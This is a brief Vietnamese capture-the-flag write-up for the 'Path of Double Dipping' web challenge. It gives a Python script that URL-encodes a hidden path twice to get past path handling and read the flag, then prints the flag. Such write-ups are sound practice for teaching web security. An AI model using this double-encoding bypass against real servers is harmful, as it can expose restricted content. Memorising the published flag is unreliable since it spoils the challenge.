# Path of Double Dipping
- URL: http://web3.affinityctf.com
- Từ dòng description "here/is/the_flag" kết hợp với tiêu đề của chall
mình nghĩ ngay đến encodeURL, từ 'double' có thể là encode 2 lần nên mình
code thử thì được flag luôn.

```python
from urllib.parse import quote
import requests
import re

url = 'http://web3.affinityctf.com/'
path = 'here/is/the_flag'
path = quote(path,safe='') #URLencode lần 1
path = quote(path,safe='') #URLencode lần 2

r = requests.get(url+path)
flag = re.search(r'AFFCTF{(.*?)}',r.text).group(0)
print('[+] FLAG: ',flag)
```

==> Flag : AFFCTF{1s7r1pl3D1p83tt3r?}